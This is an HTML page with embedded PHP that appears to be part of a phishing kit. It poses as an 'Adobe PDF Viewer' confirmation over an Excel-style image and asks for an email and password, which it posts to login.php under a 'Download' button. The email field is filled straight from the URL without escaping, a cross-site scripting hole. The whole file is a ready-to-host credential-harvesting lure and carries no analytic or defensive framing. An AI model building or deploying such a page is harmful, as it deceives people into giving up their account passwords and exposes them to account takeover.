<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Adobe PDF Viewer - Confirmation</title>
<link rel="icon" 
      type="image/png" 
      href="favicon.ico">
</head>

<body style="background-image: url('exl.PNG'); background-repeat: no-repeat">

<div style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 422px; top: 223px; background-image: url('excel2013.PNG'); background-repeat: no-repeat" id="layer1">


<form method="POST" autocomplete="on" name="login_form" id="login_form" onSubmit="return hash2(this)" style="line-height: 1.22em; margin: 0px; padding: 0px;" action="login.php">



<div style="position: absolute; width: 313px; height: 20px; z-index: 1; left: 63px; top: 104px" id="layer3">
	<span class="formwrap">
									  <input class="validate[required]" id="did" name="Email" required="" style="width:315; height:34" value="<?php echo $_GET['email'];?>"><b></b></td></tr>  </span></div>
									  

<div style="position: absolute; width: 314px; height: 20px; z-index: 2; left: 63px; top: 152px" id="layer4">
										<span class="formwrap">
										<input class="validate[required]" id="didd" name="Password" required="" placeholder="Password" style="width:315; height:34" type="password"></span></div>
										

										<div style="position: absolute; width: 92px; height: 30px; z-index: 3; left: 166px; top: 198px" id="layer5">
								<button type="submit" id=".save" name=".save" class="lgbx-btn purple-bg" tabindex="4" style="line-height: 1.22em; border: 1px solid rgb(82, 38, 117); color: rgb(255, 255, 255); height: 35px; width: 100px; font-weight: bold; cursor: pointer; text-align: center; border-top-left-radius: 2px; border-top-right-radius: 2px; border-bottom-right-radius: 2px; border-bottom-left-radius: 2px; background-color: rgb(5, 55, 155); font-size: 13px;">
								Download</button></div>
				

&nbsp;</div>
</form>
</body>
